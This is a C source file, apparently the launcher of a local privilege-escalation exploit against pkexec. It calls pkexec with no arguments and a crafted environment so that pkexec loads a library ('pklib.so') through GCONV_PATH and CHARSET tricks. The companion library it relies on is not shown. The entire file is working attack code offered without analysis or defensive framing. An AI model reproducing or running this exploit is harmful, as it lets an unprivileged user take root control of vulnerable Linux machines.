#include <unistd.h>

int main(int argc, char **argv)
{
    char const pkexec[] = "/usr/bin/pkexec";

    char *const args[] = {
        NULL};

    char *const envs[] = {
        "pklib.so:.",
        "PATH=GCONV_PATH=.",
        "SHELL=/open/door/to/hell",
        "CHARSET=PKLIB",
        "GIO_USE_VFS=",
        NULL};

    return execve(pkexec, args, envs);
}
